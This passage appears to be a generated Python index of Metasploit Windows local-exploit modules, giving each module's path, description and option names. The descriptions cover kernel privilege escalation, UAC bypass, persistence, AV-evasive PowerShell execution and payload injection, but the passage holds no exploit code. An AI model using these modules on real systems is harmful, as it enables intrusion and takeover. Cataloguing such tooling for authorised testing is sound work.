        of bounds array access to corrupt memory and escape to the host. This module has been
        tested successfully on Windows 7 SP1 (64 bits) as Host running  Virtual Box 4.3.6.
      
		"""

		path = 'windows/local/virtual_box_opengl_escape'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_panda_psevents(object):
		"""
		
        PSEvents.exe within several Panda Security products runs hourly with SYSTEM privileges.
        When run, it checks a user writable folder for certain DLL files, and if any are found
        they are automatically run.
        Vulnerable Products:
        Panda Global Protection 2016 (<=16.1.2)
        Panda Antivirus Pro 2016 (<=16.1.2)
        Panda Small Busines Protetion (<=16.1.2)
        Panda Internet Security 2016 (<=16.1.2)
      
		"""

		path = 'windows/local/panda_psevents'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_DLL = 'DLL'
			required_ListenerTimeout = 'ListenerTimeout'

	class windows_local_ms16_016_webdav(object):
		"""
		
        This module exploits the vulnerability in mrxdav.sys described by MS16-016.  The module will spawn
        a process on the target system and elevate it's privileges to NT AUTHORITY/SYSTEM before executing
        the specified payload within the context of the elevated process.
      
		"""

		path = 'windows/local/ms16_016_webdav'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_ps_wmi_exec(object):
		"""
		
        This module uses WMI execution to launch a payload instance on a remote machine.
        In order to avoid AV detection, all execution is performed in memory via psh-net
        encoded payload. Persistence option can be set to keep the payload looping while
        a handler is present to receive it. By default the module runs as the current
        process owner. The module can be configured with credentials for the remote host
        with which to launch the process.
      
		"""

		path = 'windows/local/ps_wmi_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			required_Powershell_Post_timeout = 'Powershell::Post::timeout'
			required_Powershell_Post_log_output = 'Powershell::Post::log_output'
			required_Powershell_Post_dry_run = 'Powershell::Post::dry_run'
			required_Powershell_Post_force_wow64 = 'Powershell::Post::force_wow64'
			CERT_PATH = 'CERT_PATH'
			RHOSTS = 'RHOSTS'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			DOMAIN = 'DOMAIN'
			PowerShellPersist = 'PowerShellPersist'
			RunRemoteWow64 = 'RunRemoteWow64'

	class windows_local_pxeexploit(object):
		"""
		
        This module provides a PXE server, running a DHCP and TFTP server.
        The default configuration loads a linux kernel and initrd into memory that
        reads the hard drive; placing the payload on the hard drive of any Windows
        partition seen.

        Note: the displayed IP address of a target is the address this DHCP server
        handed out, not the "normal" IP address the host uses.
      
		"""

		path = 'windows/local/pxeexploit'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SESSION = 'SESSION'
			TFTPROOT = 'TFTPROOT'
			SRVHOST = 'SRVHOST'
			NETMASK = 'NETMASK'
			required_RESETPXE = 'RESETPXE'
			DHCPIPSTART = 'DHCPIPSTART'
			DHCPIPEND = 'DHCPIPEND'

	class windows_local_always_install_elevated(object):
		"""
		
          This module checks the AlwaysInstallElevated registry keys which dictates if
        .MSI files should be installed with elevated privileges (NT AUTHORITY/SYSTEM).
        The generated .MSI file has an embedded executable which is extracted and run
        by the installer. After execution the .MSI file intentionally fails installation
        (by calling some invalid VBS) to prevent it being registered on the system.
        By running this with the /quiet argument the error will not be seen by the user.
      
		"""

		path = 'windows/local/always_install_elevated'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			LOG_FILE = 'LOG_FILE'
			required_QUIET = 'QUIET'

	class windows_local_ms15_078_atmfd_bof(object):
		"""
		
        This module exploits a pool based buffer overflow in the atmfd.dll driver when parsing
        a malformed font. The vulnerability was exploited by the hacking team and disclosed on
        the july data leak. This module has been tested successfully on vulnerable builds of
        Windows 8.1 x64.
      
		"""

		path = 'windows/local/ms15_078_atmfd_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_lenovo_systemupdate(object):
		"""
		
        The named pipe, /SUPipeServer, can be accessed by normal users to interact with the
        System update service. The service provides the possibility to execute arbitrary
        commands as SYSTEM if a valid security token is provided. This token can be generated
        by calling the GetSystemInfoData function in the DLL tvsutil.dll. Please, note that the
        System Update is stopped by default but can be started/stopped calling the Executable
        ConfigService.exe.
      
		"""

		path = 'windows/local/lenovo_systemupdate'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			WritableDir = 'WritableDir'
			required_Sleep = 'Sleep'

	class windows_local_agnitum_outpost_acs(object):
		"""
		
        This module exploits a directory traversal vulnerability on Agnitum Outpost Internet
        Security 8.1. The vulnerability exists in the acs.exe component, allowing the user to load
        load arbitrary DLLs through the acsipc_server named pipe, and finally execute arbitrary
        code with SYSTEM privileges. This module has been tested successfully on Windows 7 SP1 with
        Agnitum Outpost Internet Security 8.1 (32 bits and 64 bits versions).
      
		"""

		path = 'windows/local/agnitum_outpost_acs'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			WritableDir = 'WritableDir'
			required_DEPTH = 'DEPTH'

	class windows_local_ms15_004_tswbproxy(object):
		"""
		
        This module abuses a process creation policy in Internet Explorer's
        sandbox; specifically, Microsoft's RemoteApp and Desktop Connections runtime
        proxy, TSWbPrxy.exe.  This vulnerability allows the attacker to escape the
        Protected Mode and execute code with Medium Integrity. At the moment, this
        module only bypass Protected Mode on Windows 7 SP1 and prior (32 bits). This
        module has been tested successfully on Windows 7 SP1 (32 bits) with IE 8 and IE
        11.
      
		"""

		path = 'windows/local/ms15_004_tswbproxy'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'

	class windows_local_run_as(object):
		"""
		
        This module will login with the specified username/password and execute the
        supplied command as a hidden process. Output is not returned by default.
        Unless targetting a local user either set the DOMAIN, or specify a UPN user
        format (e.g. user@domain). This uses the CreateProcessWithLogonW WinAPI function.

        A custom command line can be sent instead of uploading an executable.
        APPLICAITON_NAME and COMMAND_LINE are passed to lpApplicationName and lpCommandLine
        respectively. See the MSDN documentation for how these two values interact.
      
		"""

		path = 'windows/local/run_as'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			DOMAIN = 'DOMAIN'
			required_USER = 'USER'
			required_PASSWORD = 'PASSWORD'
			APPLICATION_NAME = 'APPLICATION_NAME'
			COMMAND_LINE = 'COMMAND_LINE'
			required_USE_CUSTOM_COMMAND = 'USE_CUSTOM_COMMAND'

	class windows_local_novell_client_nwfs(object):
		"""
		
        This module exploits a flaw in the nwfs.sys driver to overwrite data in kernel
        space. The corruption occurs while handling ioctl requests with code 0x1438BB,
        where a 0x00000009 dword is written to an arbitrary address. An entry within the
        HalDispatchTable is overwritten in order to execute arbitrary code when
        NtQueryIntervalProfile is called. The module has been tested successfully on
        Windows XP SP3 with Novell Client 4.91 SP4.
      
		"""

		path = 'windows/local/novell_client_nwfs'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_ms14_058_track_popup_menu(object):
		"""
		
        This module exploits a NULL Pointer Dereference in win32k.sys, the vulnerability
        can be triggered through the use of TrackPopupMenu. Under special conditions, the
        NULL pointer dereference can be abused on xxxSendMessageTimeout to achieve arbitrary
        code execution. This module has been tested successfully on Windows XP SP3, Windows
        2003 SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 and Windows
        2008 R2 SP1 64 bits.
      
		"""

		path = 'windows/local/ms14_058_track_popup_menu'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_ms14_070_tcpip_ioctl(object):
		"""
		
        A vulnerability within the Microsoft TCP/IP protocol driver tcpip.sys
        can allow a local attacker to trigger a NULL pointer dereference by using a
        specially crafted IOCTL. This flaw can be abused to elevate privileges to
        SYSTEM.
      
		"""

		path = 'windows/local/ms14_070_tcpip_ioctl'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_ms13_053_schlamperei(object):
		"""
		
        This module leverages a kernel pool overflow in Win32k which allows local privilege escalation.
        The kernel shellcode nulls the ACL for the winlogon.exe process (a SYSTEM process).
        This allows any unprivileged process to freely migrate to winlogon.exe, achieving
        privilege escalation. This exploit was used in pwn2own 2013 by MWR to break out of chrome's sandbox.
        NOTE: when a meterpreter session started by this exploit exits, winlogin.exe is likely to crash.
      
		"""

		path = 'windows/local/ms13_053_schlamperei'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_persistence(object):
		"""
		
        This module will install a payload that is executed during boot.
        It will be executed either at user logon or system startup via the registry
        value in "CurrentVersion/Run" (depending on privilege and selected method).
      
		"""

		path = 'windows/local/persistence'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_DELAY = 'DELAY'
			required_STARTUP = 'STARTUP'
			VBS_NAME = 'VBS_NAME'
			EXE_NAME = 'EXE_NAME'
			REG_NAME = 'REG_NAME'
			PATH = 'PATH'
			HANDLER = 'HANDLER'
			EXEC_AFTER = 'EXEC_AFTER'

	class windows_local_bypassuac_injection(object):
		"""
		
        This module will bypass Windows UAC by utilizing the trusted publisher
        certificate through process injection. It will spawn a second shell that
        has the UAC flag turned off. This module uses the Reflective DLL Injection
        technique to drop only the DLL payload binary instead of three seperate
        binaries in the standard technique. However, it requires the correct
        architecture to be selected, (use x64 for SYSWOW64 systems also).
        If specifying EXE::Custom your DLL should call ExitProcess() after starting
        your payload in a seperate process.
      
		"""

		path = 'windows/local/bypassuac_injection'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'

	class windows_local_ms13_081_track_popup_menu(object):
		"""
		
        This module exploits a vulnerability in win32k.sys where under
        specific conditions TrackPopupMenuEx will pass a NULL pointer to
        the MNEndMenuState procedure. This module has been tested
        successfully on Windows 7 SP0 and Windows 7 SP1.
      
		"""

		path = 'windows/local/ms13_081_track_popup_menu'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_s4u_persistence(object):
		"""
		
        Creates a scheduled task that will run using service-for-user (S4U).
        This allows the scheduled task to run even as an unprivileged user
        that is not logged into the device. This will result in lower security
        context, allowing access to local resources only. The module
        requires 'Logon as a batch job' permissions (SeBatchLogonRight).
      
		"""

		path = 'windows/local/s4u_persistence'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FREQUENCY = 'FREQUENCY'
			EXPIRE_TIME = 'EXPIRE_TIME'
			required_TRIGGER = 'TRIGGER'
			REXENAME = 'REXENAME'
			RTASKNAME = 'RTASKNAME'
			PATH = 'PATH'
			EVENT_LOG = 'EVENT_LOG'
			EVENT_ID = 'EVENT_ID'
			XPATH = 'XPATH'

	class windows_local_ms10_015_kitrap0d(object):
		"""
		
        This module will create a new session with SYSTEM privileges via the
        KiTrap0D exlpoit by Tavis Ormandy. If the session is use is already
        elevated then the exploit will not run. The module relies on kitrap0d.x86.dll,
        and is not supported on x64 editions of Windows.
      
		"""

		path = 'windows/local/ms10_015_kitrap0d'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_adobe_sandbox_adobecollabsync(object):
		"""
		
          This module exploits a vulnerability on Adobe Reader X Sandbox. The
        vulnerability is due to a sandbox rule allowing a Low Integrity AcroRd32.exe
        process to write register values which can be used to trigger a buffer overflow on
        the AdobeCollabSync component, allowing to achieve Medium Integrity Level
        privileges from a Low Integrity AcroRd32.exe process. This module has been tested
        successfully on Adobe Reader X 10.1.4 over Windows 7 SP1.
      
		"""

		path = 'windows/local/adobe_sandbox_adobecollabsync'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_local_nvidia_nvsvc(object):
		"""
		
        The named pipe, /pipe/nsvr, has a NULL DACL allowing any authenticated user to
        interact with the service. It contains a stacked based buffer overflow as a result
        of a memmove operation. Note the slight spelling differences: the executable is 'nvvsvc.exe',
        the service name is 'nvsvc', and the named pipe is 'nsvr'.

        This exploit automatically targets nvvsvc.exe versions dated Nov 3 2011, Aug 30 2012, and Dec 1 2012.
        It has been tested on Windows 7 64-bit against nvvsvc.exe dated Dec 1 2012.
      
		"""

		path = 'windows/local/nvidia_nvsvc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_ms_ndproxy(object):
		"""
		
        This module exploits a flaw in the ndproxy.sys driver on Windows XP SP3 and Windows 2003
        SP2 systems, exploited in the wild in November, 2013. The vulnerability exists while
        processing an IO Control Code 0x8fff23c8 or 0x8fff23cc, where user provided input is used
        to access an array unsafely, and the value is used to perform a call, leading to a NULL
        pointer dereference which is exploitable on both Windows XP and Windows 2003 systems. This
        module has been tested successfully on Windows XP SP3 and Windows 2003 SP2. In order to
        work the service "Routing and Remote Access" must be running on the target system.
      
		"""

		path = 'windows/local/ms_ndproxy'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_payload_inject(object):
		"""
		
          This module will inject a payload into memory of a process.  If a payload
        isn't selected, then it'll default to a reverse x86 TCP meterpreter.  If the PID
        datastore option isn't specified, then it'll inject into notepad.exe instead.
      
		"""

		path = 'windows/local/payload_inject'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			PID = 'PID'
			NEWPROCESS = 'NEWPROCESS'

	class windows_local_vss_persistence(object):
		"""
		
        This module will attempt to create a persistent payload in a new volume shadow copy. This is
        based on the VSSOwn Script originally posted by Tim Tomes and Mark Baggett. This module has
        been tested successfully on Windows 7. In order to achieve persistence through the RUNKEY
        option, the user should need password in order to start session on the target machine.
      
		"""

		path = 'windows/local/vss_persistence'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_RHOST = 'RHOST'
			required_TIMEOUT = 'TIMEOUT'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_VOLUME = 'VOLUME'
			required_EXECUTE = 'EXECUTE'
			required_SCHTASK = 'SCHTASK'
			required_RUNKEY = 'RUNKEY'
			required_DELAY = 'DELAY'
			RPATH = 'RPATH'

	class windows_local_capcom_sys_exec(object):
		"""
		
        This module abuses the Capcom.sys kernel driver's function that allows for an
        arbitrary function to be executed in the kernel from user land. This function
        purposely disables SMEP prior to invoking a function given by the caller.
        This has been tested on Windows 7, 8.1 and Windows 10 (x64).
      
		"""

		path = 'windows/local/capcom_sys_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_ms11_080_afdjoinleaf(object):
		"""
		
        This module exploits a flaw in the AfdJoinLeaf function of the
        afd.sys driver to overwrite data in kernel space.  An address
        within the HalDispatchTable is overwritten and when triggered
        with a call to NtQueryIntervalProfile will execute shellcode.

        This module will elevate itself to SYSTEM, then inject the payload
        into another SYSTEM process before restoring it's own token to
        avoid causing system instability.
      
		"""

		path = 'windows/local/ms11_080_afdjoinleaf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_ask(object):
		"""
		
        This module will attempt to elevate execution level using
        the ShellExecute undocumented RunAs flag to bypass low
        UAC settings.
      
		"""

		path = 'windows/local/ask'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
